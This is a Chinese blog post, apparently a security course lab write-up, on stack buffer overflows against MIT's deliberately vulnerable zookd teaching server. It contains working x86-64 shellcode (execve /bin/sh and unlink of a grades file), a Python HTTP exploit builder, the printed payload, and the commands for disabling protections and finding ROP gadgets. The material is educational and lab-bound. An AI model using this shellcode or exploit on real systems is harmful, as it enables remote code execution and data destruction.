---
title: Buffer Overflows
date: 2024-06-12
description: 
categories: 
  - Hack
  - linux
  - x86
image: 
---

来自 Sercurity sp24 的期末大作业，难得找了一个自己比较感兴趣的题目，整个过程学到了许多东西，以下是完整记录。


## 1. Buffer overflow theory

### 1.1 The Stack

以一段具备漏洞的 c 程序为例：

```c
#include <string.h>
#include <stdio.h>
void copy(char *str) {
   char buffer[16];
   strcpy(buffer, str);
   printf("%s\n", buffer);
}

int main (int argc, char **argv) {
   copy(argv[1]);
   return 0;
}
```

在进入 `copy` 函数之后，整个程序的调用栈如下图左侧。上面是低地址，下面是高地址，栈从高地址向低地址生长，所以从 `main` 调用 `copy` 函数，可以看到 `copy` 函数的栈帧在图中叠在 `main` 函数栈帧之上（即更靠近低地址的一侧）。

展开看 `copy's frame` 看到的内容很可能是下图右侧中展示的情况。

进入 `copy` 函数时，栈帧的初始化从下往上看：
1. 首先是保存函数返回地址(在 `main` 中调用 `copy` 行的下一个指令地址)
2. 然后保存上一个函数 `main` 的帧指针
3. 接下来是保存本地变量，这里即是 `char buffer[16]`
4. 后续是函数的参数，这里是 `str`

```txt
                    .-------0x00-------.                        #          .-------0x00-------.
                    :                  :                        #          :                  :
                    :       ....       :                        #          |                  | <- %rsp
                    |------------------|                        #          |     padding      |
    "top" of stack  |                  |  "bottom" of memory    #          |       str        |
                    |   copy's frame   |  (low addresses)       #          |  buffer[ 0-7  ]  |
                    |                  |                        #          |  buffer[ 8-15 ]  | <- %rbp
                    |------------------|                        #          | [ main's  %rbp ] |
                    |                  |                        #          | [return address] |
 "bottom" of stack  |   main's frame   |  "top" of memory       #          |------------------|
                    |                  |   (high addresses)     #          :   main's frame   :
                    `------------------`                        #          `------------------`
```

### 1.2 攻击原理

本 `copy` 函数的作用即是把 str 指向的字符串中的内容拷贝到 buffer[16] 中来。这里使用的拷贝函数是 `strcpy`，他的特点是一直读取 src string 直到遇到 `/0` 才停下来，这意味着即使 str 指向的字符串的长度超过 buffer 的大小，也能完成拷贝。而一旦这么做，就意味着在 `copy` 的栈帧中， buffer 之后的内容也会被来自 str 的字符串内容覆盖，这就是我们想要利用的 buffer overflow 的漏洞。

我们要做的事情是，利用缓冲溢出把 `[return address]` 替换成攻击程序的首地址，这样当 `copy` 函数退出时，程序计数器 pc 就会跳转到我们自己写的攻击程序，这个时候程序的控制权就已经被我们劫持了。一般来说，攻击程序的首地址就是 buffer 的首地址，而我们的攻击程序就写在 buffer 中的位置。

很多时候，这个攻击程序被称作 `shellcode`，因为这个程序的内容很可能是通过系统调用 exec 把程序替换成 `/bin/sh`，也即程序的输入者（来自客户端）现在黑入了服务器的 shell，之后攻击者就可以利用终端来进行进一步的破坏，比如直接在终端内执行 `rm -rf *` 把服务器磁盘上的重要内容删个干干净净！

值得注意的是，放在栈中的可执行内容必须是已经编译为机器码的内容，因为这样才能直接被执行。所以，一般来说 shellcode 是直接编写汇编代码来得到，原因主要有二：

1. 汇编代码对整个 `shellcode` 的字节数把控更加精细（我们之后要把这个 `code` 塞进 `buffer` 内的，至少要确保 `buffer` 到 `return address` 之前的空间放得下我们的代码），而如果你是使用高级语言比如 c 语言，很难保证最后编译出来的代码是什么样的（涉及到 c编译器 的各种优化）。
2. 在汇编代码中我们对地址的控制更加贴近底层，你可以直接跳转到一个相对地址（比如 `jmp label`），编写代码时会比较容易。（之后会讲解整个 `shellcode` 的跳转流）

这里还有一个很重要的点我觉得需要提一下，那就是 c 语言是一个划分了 栈区、堆区、数据区、代码区的语言，而我们这里注入的 shellcode 已经在原程序的栈中了，继续分区显然是不现实的，所以我们的 `shellcode` 只剩下了可执行指令本身（即 c 语言中代码区的部分），我们不再有栈区，不再有堆区，也不再有数据区。所以使用 c 语言来编写 `shellcode` 是不现实的，接下来将看到如何用汇编代码来实现 `shellcode`。

### 1.3 shellcode

这里先给出 c 语言版本的 shellcode 中主要执行的任务，方便对照理解：

```c
void main() {
  char *name[2];
  name[0] = "/bin/sh";
  name[1] = NULL;
  execve(name[0], name, NULL);
  exit(0);
}
```

实际的 shellcode 主要部分就是以上示例 c 代码的汇编版本。不过我们主要面临的问题是：由于 shellcode 在注入到目标程序栈中之后，只剩下代码区了，所以这里 c 语言中的临时变量 `name[2]` 不再可以简单的声明出来，而是需要我们自己在汇编代码中进行构造。所以完整的汇编 shellcode 还需要进行额外处理：

```s
#include <sys/syscall.h>

#define STRING  "/bin/sh"
#define STRLEN  7
#define ARGV    (STRLEN+1)
#define ENVP    (ARGV+8)

.globl main
    .type   main, @function

main:
    jmp     calladdr

popladdr:
    popq    %rcx
    movq    %rcx,(ARGV)(%rcx)       /* set up argv pointer to pathname */
    xorq    %rax,%rax               /* get a 64-bit zero value */
    movb    %al,(STRLEN)(%rcx)      /* null-terminate our string */
    movq    %rax,(ENVP)(%rcx)       /* set up null envp */

    movb    $SYS_execve,%al         /* syscall arg 1: syscall number */
    movq    %rcx,%rdi               /* syscall arg 2: string pathname */
    leaq    ARGV(%rcx),%rsi         /* syscall arg 2: argv */
    leaq    ENVP(%rcx),%rdx         /* syscall arg 3: envp */
    syscall                 /* invoke syscall */

    movb    $SYS_exit,%al           /* syscall arg 1: SYS_exit (60) */
    xorq    %rdi,%rdi               /* syscall arg 2: 0 */
    syscall                 /* invoke syscall */

calladdr:
    call    popladdr
    .ascii  STRING
```

以上是 x86_64 架构的汇编代码示例（可以在终端中通过 `uname -a` 查看机器架构信息）

注意：这里开头出现了 c 语言中的  `#include` 和 `#define`，但是并不妨碍这是一个汇编程序，这里简单解释一下为什么可以使用 c 语言风格的预处理信息语法：

1. `gcc` 编译器的完整过程是，c 源码 -> 中间代码 -> 汇编代码 -> 可执行机器码。即包括了从特定架构的汇编代码（这里是 x86_64）到二进制机器码的过程，所以我们可以使用 gcc 编译来得到以上汇编代码的二进制码。
2. 预处理信息是在编译前处理的，比如 `#define` 只是在编译之前把名称替换为值，并不影响实际的代码，也无关乎这原本到底是 c 语言代码还是 汇编代码；另外，这里虽然还有 `#include <sys/syscall.h>`，但只是为了引入来自 `syscall.h` 中的 `#define` 内容，即本质上也只用了 `#define`，在后续系统调用之前可以看到直接使用 `$SYS_execve` 来指定系统调用号，而并没有使用到 `syscall.h` 中任何实际的 c 语言代码，所以也是可行的。

然后看到 `popladdr` 部分的内容，这里用空行分出成了 3 个小部分，第一部分即是我们准备 `char* name[2]` 的过程，第二部分即是设置参数并调用 execve(name[0], name, NULL) 的过程，第三部分即是设置参数并调用 exit(0) 的过程。

我们首先要解决的问题是，让 `/bin/sh` 这个字符串保存在 shellcode 中的某一个位置，并且我们需要知道他的地址。在 c 语言中，我们只需要声明这个变量，这个变量会保存在程序的栈上，然后通过变量名就可以访问这个字符串。但是现在，我们只有一个所谓的代码区，所以首先是在 shellcode 的结尾，通过汇编语句 `.ascii "/bin/sh"` 把这个字符串写进代码区。

> 这里为什么可以直接把字符串放在代码区了？注意！在常规的汇编代码中，我们的字符串可能是通过 `.data  .ascii "xxx"` 来定义的，并放在程序最开头，这样定义的字符串是存放在 data 区，而现在我们只是把 `.ascii "xxx"` 单独发在代码的结尾，他是属于 `.text` 的范围的。

现在有了字符串，我们还需要知道他的地址。这里采取的一个很巧妙的方法是，在 shellcode 的入口处，先直接使用 `jmp     calladdr` 跳转到程序结尾，然后再该处再使用 `call    popladdr` 跳转到 `popladdr` 部分的代码。`call` 指令执行之后，其下一个指令的地址会入栈，而下一个指令的地址刚好就是我们保存的字符串的地址。所以在到达 `popladdr` 的时候，只需要通过 `popq` 即可把该字符串所在地址拿到寄存器中使用。

`popq` 之后的四行是为 string 添加 0 终结符，以及对 `char name[2]` 的构造，构造完的数组是存放紧接在 `.ascii STRING` 之后的内存位置，这也是为什么之前要把 `/bin/sh` 这个字符串放在末尾，因为之后还需要留空间给这里进一步声明本地变量。（相当于是，利用 call 和 popq 来获取临时变量地址只能获取 1 个地址，但是我们整个过程用到的临时变量多于 1 个，所以把多的放在第一个之后，就可以利用第 1 个 + 地址偏移来读取到其他临时变量）

这里需要着重注意的问题主要有两个：

1. `popq` 之后的这四行，实际上包含了对代码自己的修改，即在**运行时阶段**还往代码里面添加内容。如果这是一个正常的程序，这是不允许的，因为代码段是只读不可写，所以这个代码实际上如果作为一个正常程序无法直接运行，反而是现在作为攻击程序注入到目标程序的栈中后可以执行。
2. 构造的数据中包含了一个值为 NULL 的变量（name[1]），注意这里不能直接对内存赋立即数 0，而是利用异或运算来得到 0（一个数与自身的异或得到 0）。这是因为，构造的 shellcode 中每一个字节都不能出现任何 0 值，否则会被字符串复制函数认为字符串终结了，复制过去的 shellcode 就不完整了。（shellcode 中的其他地方也必须保证不能出现 0，值得庆幸的是，exec 和 exit 的调用号都不是 0）

## 2. Implementation

### 2.1 Introduction

在 2024 年的今天，想要实现上面所说的栈缓冲溢出攻击不是一件容易的事情，因为现在的编译器和操作系统做了很多对缓冲溢出攻击的防范，主要有以下几种：

1. **内存金丝雀**：编译器会向二进制文件中注入一段代码，这段代码的作用是在每个函数栈帧的本地变量和返回地址之前存放一些特定的值，在函数返回之前，会检查该值是否正确，之后才能跳转到返回地址，否则程序退出。**目前，尚未有公开的有效破解方法可以完全绕过内存金丝雀的保护。**
2. **W xor X**：这个特性也是编译器提供的，效果是使得进程中所有内存要么是 `Writable` 要么是 `Executable`，即二者是异或关系。对于栈这种可写区来说，自然就是不可执行的，即程序计数器指针跳转到栈区时程序会异常退出。
3. **Fortified Source**：gcc 编译器默认会对 `strcpy`、`strcat` 等有风险的库函数进行安全检查，防止发生栈溢出。
4. **地址空间随机化**：当一个程序启动时，操作系统内核会随机化程序在内存中的位置，包括组成程序代码区的指令、堆栈、任何动态链接库的位置。这会让攻击者找到正确的返回地址的难度大大增加。当然，攻击者可以选择在程序入口之前加入大段的 `nop` 空指令来布置“雪地”，这样只有跳转到这大片的雪地之间，程序计数器指针最终都会滑雪到达 shellcode 的入口。(不过最终还是会被内存金丝雀拦下来)

对于一个测试程序，如果想要规避前三点编译器带来的保护，在编译被攻击程序时，需要使用以下命令：

```sh
gcc -g -fno-stack-protector -z execstack xxx.c -o xxx -D_FORTIFY_SOURCE=0
```

- `-fno-stack-protector` 禁用内存金丝雀
- `-z execstack` 使得栈可执行（禁用 Write XOR Execute）
- `-D_FORTIFY_SOURCE=0` 禁用 Fortified Source：即关闭对于的栈溢出的检测

而需要规避第四点内核的保护，需要在运行程序的时候，通过 `setarch` 工具来禁用地址随机化：

```sh
env - setarch -R ./xxx
```

> 关于 env 和 setarch (都是命令行工具)的更细致说明这里不再赘述，可在 linux 终端中通过 `xxx --help` 查看工具使用说明

而这里我具体攻击实践选择的目标是 MIT 的一个名为 zookd 的教学用 web server，这实际上也是 MIT 计算机安全课程的一个 Buffer overflows 实验中使用的 web server。这个服务器的源码中有着许多 MIT 教授们故意留下的安全漏洞，可以自行在本地部署，并阅读源码找出漏洞之后发动攻击。(此处相关的参考资料在结尾会给出链接)

使用这个 zookd 来作为攻击目标的话，上面提到的多种溢出防范特性都会被默认关闭，攻击也会相对来说比较顺利。此外，这相比自己写一个简易的被攻击程序，直接攻击一个真实可以响应 http 请求的 web server 也会有更好的实践体验。

该服务器上运行的一个名为 zoobar 的虚拟币交易 web application 在浏览器中访问的页面如下：

![alt text](image-1.png)

### 2.2 Finding buffer overflows

考虑到这是一个 web server，所以一个显而易见的注入点就是通过 http 请求来注入 shellcode，所以首先在 server 中与 http 请求处理相关的源码中寻找可以发生缓冲溢出的函数。

一般来说，寻找的目标是那种带 local buffer 的函数，因为本地变量会保存在栈上，而如果是 static buffer 或者在堆上创建的 buffer 则一般不作为目标。

这里寻找到一个处理请求头的函数，输入是一个代表一个已接受的请求的 fd 值，随后循环读取行，对于每一行读出请求头的 `key:value` 值，其中 `value` 会 url 解码之后存储在 `char value[512]` 中，这里这个名为 `value` 的 buffer 即是我们在寻找的目标栈上缓冲区了。随后进入 `url_decode()` 函数查看其解码逻辑，刚好是以字符终结符 `/0` 作为解析完毕的判断逻辑，所以这里是一个可以发起溢出攻击的漏洞。

```c
const char *http_request_headers(int fd) {
    static char buf[8192];      /* static variables are not on the stack */
    int i;
    char value[512];
    char envvar[512];

    /* Now parse HTTP headers */
    for (;;) {
        if (http_read_line(fd, buf, sizeof(buf)) < 0)
            return "Socket IO error";

        /* parse the key: value of the header */
        // `sp` is the value of a header

        /* Decode URL escape sequences in the value */
        url_decode(value, sp);

        /* Store header in env. variable for application code */
        //...
    }

    return 0;
}
```

### 2.3 Shellcode injection

确定目标之后，接下来通过 gdb 来查看该函数的栈帧以获取攻击必要信息（在真实的攻击场景中由于不知道目标服务器的源码，所以很多时候需要猜测攻击，这里直接获取关键地址信息更快捷）

服务器在后台启动后，使用 gdb 设置断点为 `http_request_headers`，然后键入 `c` 运行并等待 http 请求。接着在另一个终端对服务器发起一次 http 请求（使用 python 脚本即可完成，或者 curl 工具）

之后服务器服务本次请求的子进程会停在该函数位置：

```sh
[Switching to Thread 0x1555555115c0 (LWP 16180)]

Thread 2.1 "zookd-exstack" hit Breakpoint 1, http_request_headers (fd=4) at http.c:124
warning: Source file is more recent than executable.
124         touch("http_request_headers");
```

紧接着分别打印本地变量 `value[512]` 的地址以及查看函数栈帧中保存的函数返回地址：

```sh
(gdb) print &value
$1 = (char (*)[512]) 0x7fffffffda50
(gdb) info frame
Stack level 0, frame at 0x7fffffffdc90:
 rip = 0x555555556f4b in http_request_headers (http.c:124); saved rip = 0x555555556b29
 called by frame at 0x7fffffffecc0
 source language c.
 Arglist at 0x7fffffffdc80, args: fd=4
 Locals at 0x7fffffffdc80, Previous frame\'s sp is 0x7fffffffdc90
 Saved registers:
  rbx at 0x7fffffffdc78, rbp at 0x7fffffffdc80, rip at 0x7fffffffdc88
```

这里可以得知：

- `&value = 0x7fffffffda50`：即缓冲区的首地址
- `Saved registers rip at 0x7fffffffdc88`：即栈帧中保存的函数返回地址的存储位置（注意，不是返回地址本身的值）

> 为什么这里的地址是 12 位十六进制呢（即48bits），因为我们目前位于用户空间，而 x86_64 规定从 0x000000000000 到 0x00007fffffffffff 是用户空间地址，从 0xffff800000000000 到 0xffffffffffffffff 是内核空间地址。由于高位都是 0，所以 gdb 没有显示出来。实际上，整个虚拟地址空间都只使用低 48 bits，而高 16 bits 是通过符号扩展得到的。

查看当前位置的完整函数调用栈：

```sh
(gdb) bt
#0  http_request_headers (fd=4) at http.c:124
#1  0x0000555555556b29 in process_client (fd=4) at zookd.c:113
#2  0x0000555555556a37 in run_server (port=0x7fffffffefc5 "8080") at zookd.c:83
#3  0x00005555555567ce in main (argc=2, argv=0x7fffffffee28) at zookd.c:28
```

可以以看到查看完整调用栈即是显示完整 64 bits 地址的。并且当前 gdb 追踪到的调用栈是正常情况，稍后可以对比看看被缓冲溢出攻击覆盖栈帧保存的返回地址之后，调用栈会发生什么变化。

接着，直接使用上文中已经给出的 `shellcode.S`，做如下修改：主要是系统调用部分从执行 exec 替换成执行 unlink，即直接删除服务器上的某个文件(目标文件定为 `~/grades.txt`，即删除目标服务器上记录学生成绩的文件)，方便反复测试观察：

```s
#include <sys/syscall.h>
#define STRING    "/home/student/grades.txt"
#define STRLEN    24
#define ARGV    (STRLEN+1)

```

```s
### Same as above...

 popladdr:
    popq    %rcx
    xorq    %rax,%rax            /* get a 64-bit zero value */
    movb    %al,(STRLEN)(%rcx)   /* null-terminate our string */

    movb    $SYS_unlink,%al      /* set up the syscall number */
    movq    %rcx,%rdi            /* syscall arg 1: string pathname */
    syscall                      /* invoke syscall */
    xorq    %rax,%rax            /* get a 64-bit zero value */
    movb    $SYS_exit,%al        /* set up the syscall number */
    xorq    %rdi,%rdi            /* syscall arg 1: 0 */
    syscall                      /* invoke syscall */

### Same as above...
```

然后生成对应的二进制文件：

```sh
cc -m64   -c -o shellcode.o shellcode.S
objcopy -S -O binary -j .text shellcode.o shellcode.bin
```

- `-m64` 是指定架构为 x86_64; `-c` 是只编译和汇编，不进行链接
- `-S` 是移除符号表和调试信息，确保生成的二进制文件和原来的汇编代码大小一致；`-j .text` 是只拷贝 text 段的内容，即代码段。

随后得到的 `shellcode.bin` 可以读入 python 脚本中:

```sh
shellfile = open("shellcode.bin", "rb")
shellcode = shellfile.read()
```


用于构造一个 http 请求：


```py
# 这里的地址即是上一步从 gdb 中分析得到的地址
stack_buffer = 0x7fffffffda50
stack_retaddr = 0x7fffffffdc88

def build_exploit(shellcode):
    req =   b"GET / HTTP/1.0\r\n" + \
            b"hack-you: " + \
            urllib.parse.quote(shellcode).encode('ascii') + \
            b"A" * (stack_retaddr - stack_buffer - len(shellcode)) + \
            struct.pack("<Q", stack_buffer) + b"\r\n" + \
            b"\r\n"
    return req
```

这里首先构造一个正常的请求行 `GET / HTTP/1.0\r\n`。最后添加一个名为 `hack-you` 的自定义请求头字段，字段的值则是我们想要利用 `url_decode` 进行注入的内容。其中 shellcode 和 返回地址 中间使用字母 A 填充。

随后运行该脚本即可：

```sh
tudent@6858-v22:~/lab$ ./exploit/4.py localhost 8080
HTTP request:
b'GET / HTTP/1.0\r\nhack-you: %EB%18YH1%C0%88A%18%B0WH%89%CF%0F%05H1%C0%B0%3CH1%FF%0F%05%E8%E3%FF%FF%FF/home/student/grades.txtAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP\xda\xff\xff\xff\x7f\x00\x00\r\n\r\n'
Connecting to localhost:8080...
Connected, sending request...
Request sent, waiting for reply...
```

在远程服务器上通过 strace 工具追踪程序进行的所有系统调用来观察被攻击的效果：

```sh
student@6858-v22:~/lab$ strace -f -p $(pgrep zookd-)
strace: Process 17654 attached
accept(3, NULL, NULL)                   = 4
clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x155555511890) = 17764
close(4)                                = 0
strace: Process 17764 attached
[pid 17654] wait4(-1,  <unfinished ...>
[pid 17764] set_robust_list(0x1555555118a0, 24) = 0
[pid 17764] access("/tmp/grading", F_OK) = -1 ENOENT (No such file or directory)
[pid 17764] read(4, "G", 1)             = 1
[pid 17764] read(4, "E", 1)             = 1
[pid 17764] read(4, "T", 1)             = 1
# read all characters in requst headers
[pid 17764] read(4, "\r", 1)            = 1
[pid 17764] read(4, "\n", 1)            = 1
[pid 17764] unlink("/home/student/grades.txt") = 0
[pid 17764] exit(0)                     = ?
[pid 17764] +++ exited with 0 +++
```

这里可以观察到，被攻击服务器的主进程号为 `17654`，接收到请求之后，fork 了一个子进程 (`17764`) 来处理请求，调用一系列 read 读取请求内容后，成功执行了 unlink 和 exit，即目标服务器上的关键文件被攻击者破坏了。

也可以在 GDB 上观察攻击发生后函数调用栈发生的变化来更深入地查看被攻击的结果：

```sh
Thread 2.1 "zookd-exstack" hit Breakpoint 1, http_request_headers (fd=4) at http.c:163
163             if (strcmp(buf, "CONTENT_TYPE") != 0 &&
(gdb) bt
#0  http_request_headers (fd=4) at http.c:163
#1  0x00007fffffffda50 in ?? ()
#2  0x0000000600000002 in ?? ()
#3  0x0000000400216bc0 in ?? ()
# ...
#45 0x0000000000000000 in ?? ()
```

这里直接跳转到 `url_decode` 运行完之后的位置，可以看到从 `http_request_headers` 开始的函数调用栈已经完全被篡改了，首先是返回地址变成了 `char value[512]` 的首地址。而后续的返回地址链也完全混乱了，原本只有 4 层函数调用，现在变成了 45 层。攻击者成功地劫持了目标服务器的程序控制流。

## 3. Deeper

以上的实现是建立在目标程序的栈是可执行的情况下，但如果目标栈是不可执行的，这个时候意味着攻击者注入的代码无法执行，所以攻击者只能利用目标程序的动态链接库中的现有代码来实现攻击。一个常见的做法是构造 ROP 链。

对目标二进制程序以及其运行时动态链接的库进行分析，很可能可以找出类似以下的指令序列：`pop xxx; ret` 或者 `mov A B; ret`。这种小段的序列称作 `gadget`，由一个或多个有效操作指令开始，以 ret 结尾。这中指令序列的作用是，结尾的 ret 可以弹出栈顶地址并跳转到该处。所以如果构造出多个 `gadget` 链接在一起的地址链，从目标栈的返回地址开始覆盖（之前仍然填充字母 'A'），就可以利用原程序已有的代码拼装并执行我们想要的程序，这种攻击又称为 `return-to-libc` 攻击，而这种构造程序的编程称为 `ROP: Return-oriented programming`，即面向返回的编程。

以上面的攻击程序为例，构造成为 ROP 链的过程如下：

首先是通过 gdb 查找 `unlink` 和 `exit` 的函数地址。之后需要处理的问题是向 `unlink` 传递参数。通过从二进制文件和动态链接库中查找满足 `popq|ret` 的 gadget。这样的 gadget 可以把栈顶的内容弹出到寄存器中，而 x86-64 的前 6 个函数参数正是用寄存器传值的，这样就可以向目标函数传入我们所需的参数。

```sh
# 这里是查找 gadget 的示范
student@6858-v22:~/lab$ ulimit -s unlimited && setarch -R ldd zookd-nxstack
        linux-vdso.so.1 (0x000015555551d000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00001555552da000)
        /lib64/ld-linux-x86-64.so.2 (0x000015555551f000)
student@6858-v22:~/lab$ ROPgadget --binary ./zookd-nxstack --only "popq|ret" > ./zookd-nxstack.txt
student@6858-v22:~/lab$ ROPgadget --binary /lib64/ld-linux-x86-64.so.2 --only "popq|ret" > ./64.so.2.txt
student@6858-v22:~/lab$ ROPgadget --binary /lib64/ld-linux-x86-64.so.2 --only "popq|ret" > ./lib64.so.2.txt
```

最后构造的 ROP 链理论上如下：

```
[ pop + ret gadget's address ] [ STRING arg for unlink ] [ unlink function address ] [ exit ...]
```

不过在 x86-64 的架构下，虚拟地址的高 16 位都是符号扩展，故最高 2 个字节很可能都是 null 字节，而 ROP 链主要又是由连续多个跳转地址构成的。所以对于字符串拷贝的处理函数引发的漏洞非常棘手，这种时候需要去查找二进制处理函数比如 memcpy 的漏洞来作为攻击点。

这里其实我还想到了另一个思路，就是将地址高 16 bits 修改（参照 [tagged pointer](https://en.wikipedia.org/wiki/Tagged_pointer)）。但是 CPU 在硬件层级会对高 16 bits 的符号扩展做严格的检查，一般来说只能对地址的地位进行标记，所以最后还是行不通。

## 4. Conclusion

总的来说，缓冲溢出攻击是通过覆盖当前函数栈帧中保存的返回地址来劫持控制流，使得程序跳转到攻击者注入的恶意代码起点，最终执行恶意代码对服务器造成破坏。

而恶意代码需要是可直接执行的二进制代码，并且由于已经在一个程序的栈中，该代码用到的所有临时变量都需要通过修改自身来创建，以及利用汇编函数的函数调用特性来获取所需变量的地址。而对于恶意代码的注入点，也需要去挖掘目标服务器上可能出现的缓冲区漏洞并构造完整的注入内容（如构造 http 请求头来确保内容可以被目标服务器接收）。

另外，在完成这次实践的过程中也学到了很多额外的知识，最后在这里简要归纳一下：

1. 在 x86_64 架构中，叶子函数（即不调用任何其他函数的函数）会在栈顶 (rsp指向的位置) 之上额外申请一个 128bytes 的区域，用于临时本地变量的直接使用，而不再移动 rsp 的高度来申请本地变量，这可以在函数的 prologue 和 epilogue 中可以省略出移动 bp 指针的 2 个指令。并且承诺这个区域中的内容不会被信号和中断处理器修改。
2. gcc 编译器在对 x86 汇编代码的编译工作中，提供了一个 `-fno-omit-frame-pointer` 优化，允许程序忽略对 bp（帧指针）寄存器的维护，即在函数的 prologue 和 epilogue 中可以省略出移动 bp 指针的 2 个指令。并且使得 bp 寄存器成为一个额外可用的通用寄存器吗。这使得在控制和访问栈时完全依赖于 sp 寄存器，对于 debug 的工作难度有所增加，不过对程序的性能有所提升。
3. 了解了关于 [ABI(Application binary interface)](https://en.wikipedia.org/wiki/Application_binary_interface) 的概念。
4. 复杂指令集（如 x86）相比精简指令集（如 RISC-V）有一个隐藏的缺点，那就是复杂指令集非常密集，任何随机的二进制字节序列都可能解释为某些有效的指令，这为攻击者构造 ROP 提供了便捷。


## 5. References

1. **[ MIT 6.858: Buffer overflows lab ]** [ https://css.csail.mit.edu/6.858/2022/labs/lab1.html](https://css.csail.mit.edu/6.858/2022/labs/lab1.html)
2. **[ Stack frame layout on x86-64 ]** [https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64](https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64)
3. **[ Smashing the stack in 21st Century ]** [https://thesquareplanet.com/blog/smashing-the-stack-21st-century/](https://thesquareplanet.com/blog/smashing-the-stack-21st-century/)
4. **[ Smashing the stack in 20th Century ]** [http://phrack.org/issues/49/14.html#article](http://phrack.org/issues/49/14.html#article)
5. **[ Wikipedia: Return-oriented programming ]** [https://en.wikipedia.org/wiki/Return-oriented_programming](https://en.wikipedia.org/wiki/Return-oriented_programming)
6. **[ MIT 6.858: Return-to-libc attack ]** [https://css.csail.mit.edu/6.858/2014/readings/return-to-libc.pd](https://css.csail.mit.edu/6.858/2014/readings/return-to-libc.pd)
7. **[ Github: ROP gadget tool ]** [https://github.com/JonathanSalwan/ROPgadget](https://github.com/JonathanSalwan/ROPgadget)
8. **[ Wikipedia: x86-64 Canonical form addresses ]** [https://en.wikipedia.org/wiki/X86-64#Canonical_form_addresses](https://en.wikipedia.org/wiki/X86-64#Canonical_form_addresses)
9.  **[ Return-oriented programming attack ]** [https://www.infosecinstitute.com/resources/hacking/return-oriented-programming-rop-attacks/](https://www.infosecinstitute.com/resources/hacking/return-oriented-programming-rop-attacks/)
10. **[ StackOverflow: Is ROP chain possible on 64 bit? ]** [https://stackoverflow.com/questions/49008275/is-rop-chain-possible-on-64-bit](https://stackoverflow.com/questions/49008275/is-rop-chain-possible-on-64-bit)
11. **[ StackOverflow: ROP exploitation in x86_64 linux ]** [https://reverseengineering.stackexchange.com/questions/3726/rop-exploitation-in-x86-64-linux](https://reverseengineering.stackexchange.com/questions/3726/rop-exploitation-in-x86-64-linux)
